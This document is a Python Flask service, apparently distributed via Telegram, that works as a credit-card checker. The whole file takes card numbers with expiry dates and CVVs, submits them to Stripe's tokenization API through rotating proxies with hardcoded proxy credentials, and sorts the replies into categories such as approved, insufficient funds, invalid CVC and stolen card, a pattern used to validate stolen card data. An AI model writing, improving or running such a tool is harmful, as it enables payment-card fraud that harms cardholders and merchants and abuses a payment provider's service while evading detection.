# 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: https://t.me/scriptdung
# 𝐁𝐚𝐜𝐤𝐮𝐩: https://t.me/scriptdungbackup
# 𝐃𝐞𝐯: @Xoarch

import asyncio
import aiohttp
import json
import re
import random
from urllib.parse import urlparse
from flask import Flask, request, jsonify
import os
import time

# ==========================================
# PROXY HANDLER
# ==========================================
PREMIUM_PROXIES = [
    "31.59.20.176:6754:klzmaipj:1ans3lrhk2lv",
    "45.38.107.97:6014:klzmaipj:1ans3lrhk2lv",
    "198.105.121.200:6462:klzmaipj:1ans3lrhk2lv",
    "64.137.96.74:6641:klzmaipj:1ans3lrhk2lv",
    "198.23.243.226:6361:klzmaipj:1ans3lrhk2lv",
    "38.154.185.97:6370:klzmaipj:1ans3lrhk2lv",
    "84.247.60.125:6095:klzmaipj:1ans3lrhk2lv",
    "142.111.67.146:5611:klzmaipj:1ans3lrhk2lv",
    "191.96.254.138:6185:klzmaipj:1ans3lrhk2lv",
    "31.58.9.4:6077:klzmaipj:1ans3lrhk2lv"
]

def get_auto_proxy():
    try:
        if os.path.exists("proxies.txt"):
            with open("proxies.txt", "r", encoding="utf-8") as f:
                proxies = [line.strip() for line in f if line.strip()]
            if proxies:
                return random.choice(proxies)
    except Exception:
        pass
    return random.choice(PREMIUM_PROXIES)

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    elif len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    else:
        return None

def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    message = str(message).upper()
    if "INSUFFICIENT_FUNDS" in message or "INSUFFICIENT FUNDS" in message:
        return "INSUFFICIENT_FUNDS"
    elif "CVV" in message or "CVC" in message:
        return "INVALID_CVC"
    elif "EXPIRED" in message:
        return "EXPIRED_CARD"
    elif "STOLEN" in message or "LOST" in message:
        return "STOLEN_CARD"
    elif "APPROVED" in message or "SUCCESS" in message:
        return "APPROVED"
    return message[:50]

# ==========================================
# STRIPE CHARGE LOGIC (Direct API)
# ==========================================
async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    gateway = "Stripe Charge"
    total_price = "1.00"
    currency = "USD"
    
    if proxy_str is None:
        proxy_str = get_auto_proxy()
    proxy = parse_proxy(proxy_str)

    try:
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=20)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                'Accept': 'application/json',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            payload = {
                'card[number]': cc,
                'card[exp_month]': mes,
                'card[exp_year]': ano,
                'card[cvc]': cvv
            }
            
            stripe_token_url = "https://api.stripe.com/v1/tokens"
            async with session.post(stripe_token_url, data=payload, headers=headers, proxy=proxy, timeout=15) as resp:
                resp_text = await resp.text()
                
                if "id: tok_" in resp_text or "token" in resp_text.lower():
                    return True, "APPROVED", gateway, total_price, currency
                elif "incorrect_cvc" in resp_text or "invalid_cvc" in resp_text:
                    return True, "INVALID_CVC", gateway, total_price, currency
                elif "insufficient_funds" in resp_text:
                    return True, "INSUFFICIENT_FUNDS", gateway, total_price, currency
                elif "card_declined" in resp_text or "generic_decline" in resp_text:
                    return True, "CARD_DECLINED", gateway, total_price, currency
                else:
                    if "error" in resp_text.lower():
                        try:
                            err_json = json.loads(resp_text) if resp_text.startswith("{") else {}
                            err_msg = err_json.get('error', {}).get('message', 'CARD_DECLINED')
                        except:
                            err_msg = "CARD_DECLINED"
                        return True, err_msg, gateway, total_price, currency
                    
                    return False, "CARD_DECLINED", gateway, total_price, currency

    except Exception as e:
        return False, f"Proxy/Network Error: {str(e)}", gateway, total_price, currency

def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {
        'cc': parts[0].strip(), 'mes': parts[1].strip(), 'ano': parts[2].strip(), 'cvv': parts[3].strip()
    }

async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)

app = Flask(__name__)

@app.route('/stripe', methods=['GET'])
def stripe_checker():
    try:
        site = request.args.get('site', 'stripe')
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        
        if not cc_string:
            return jsonify({"error": "Missing 'cc' parameter", "status": False}), 400
        
        cc_parts = parse_cc_string(cc_string)
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            if not proxy_str:
                proxy_str = get_auto_proxy()

            success, message, gateway, price, currency = loop.run_until_complete(
                process_card_async(cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv'], site, None, proxy_str)
            )
        finally:
            loop.close()
        
        clean_response = extract_clean_response(message)
        
        return jsonify({
            "Gateway": gateway,
            "Price": float(price),
            "Response": clean_response,
            "Status": success,
            "cc": cc_string
        })
        
    except Exception as e:
        return jsonify({
            "error": str(e), "status": False, "Gateway": "Stripe", "Response": "ERROR", "cc": request.args.get('cc', '')
        }), 500

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)
